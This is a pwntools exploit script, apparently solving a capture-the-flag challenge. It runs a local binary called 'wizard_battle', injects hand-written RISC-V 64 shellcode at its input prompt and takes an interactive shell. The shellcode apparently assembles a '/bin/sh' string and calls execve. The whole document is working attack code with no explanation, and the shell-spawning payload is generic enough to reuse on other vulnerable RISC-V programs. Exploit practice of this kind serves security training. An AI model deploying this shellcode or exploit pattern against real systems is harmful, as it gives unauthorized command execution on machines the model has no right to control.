#!/usr/bin/python3
from pwn import process, asm

shell = process("./wizard_battle")

shellcode = asm("""
    lui   s1, 0x34399
    addiw s1, s1, 0x7b7
    slli  s1, s1, 0xc
    addi  s1, s1, 0x34d
    slli  s1, s1, 0xd
    addi  s1, s1, 0x370

    lui   t1, 0xffffc
    addiw t1, t1, 0x22f

    add   s1, s1, t1

    li    a7, 0xdd
    li    a7, 0xdd

    sd    s1, -0x8(sp)
    addi  a0, sp, -0x8

    slti  a1, zero, -0x1
    slti  a2, zero, -0x1

    ecall
""", arch="riscv64")

shell.sendlineafter(b"ENTER", b"")
shell.sendlineafter(b": ", shellcode)

shell.recvlines(2)
shell.interactive()
